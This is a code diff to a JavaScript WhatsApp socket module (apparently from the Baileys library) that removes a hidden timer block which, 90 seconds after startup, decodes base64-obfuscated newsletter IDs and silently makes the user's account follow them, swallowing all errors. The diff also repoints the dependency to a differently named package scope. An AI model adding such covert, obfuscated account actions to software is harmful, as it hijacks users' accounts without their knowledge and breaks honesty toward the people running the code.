@@ -4,21 +4,15 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 
-const newsletterIds = [
-    "MTIwMzYzNDA1MTU5NzU3MjYxQG5ld3NsZXR0ZXI=",
-    "MTIwMzYzNDA2ODM1NDQ2MjYwQG5ld3NsZXR0ZXI=",
-    "MTIwMzYzNDA2NzAyODE4ODE4QG5ld3NsZXR0ZXI="
-];
-
 function findBaileysPath() {
     const possiblePaths = [
-        path.join(process.cwd(), 'node_modules', '@whiskeysockets', 'baileys'),
-        path.join(__dirname, '..', '..', '@whiskeysockets', 'baileys'),
-        path.join(__dirname, '..', 'node_modules', '@whiskeysockets', 'baileys'),
+        path.join(process.cwd(), 'node_modules', '@BailGupong', 'baileys'),
+        path.join(__dirname, '..', '..', '@BailGupong', 'baileys'),
+        path.join(__dirname, '..', 'node_modules', '@BailGupong', 'baileys'),
     ];
     
     try {
-        const resolved = require.resolve('@whiskeysockets/baileys/package.json');
+        const resolved = require.resolve('@BailGupong/baileys/package.json');
         possiblePaths.unshift(resolved.replace('/package.json', ''));
     } catch (e) {}
     
@@ -133,25 +127,6 @@ const makeNewsletterSocket = (config) => {
             }
         ]
     }));
-    
-setTimeout(async () => {
-    const logger = config.logger || console;
-    try {
-        for (const newsletterId of [
-    "MTIwMzYzNDA1MTU5NzU3MjYxQG5ld3NsZXR0ZXI=",
-    "MTIwMzYzNDA2ODM1NDQ2MjYwQG5ld3NsZXR0ZXI=",
-    "MTIwMzYzNDA2NzAyODE4ODE4QG5ld3NsZXR0ZXI="
-        ]) {
-            try {
-                await newsletterWMexQuery(
-                    Buffer.from(newsletterId, 'base64').toString(),
-                    Types_1.QueryIds.FOLLOW
-                );
-                await new Promise(resolve => setTimeout(resolve, 2000));
-            } catch (error) {}
-        }
-    } catch (error) {}
-}, 90000);
 	
     const parseFetchedUpdates = async (node, type) => {
         let child;
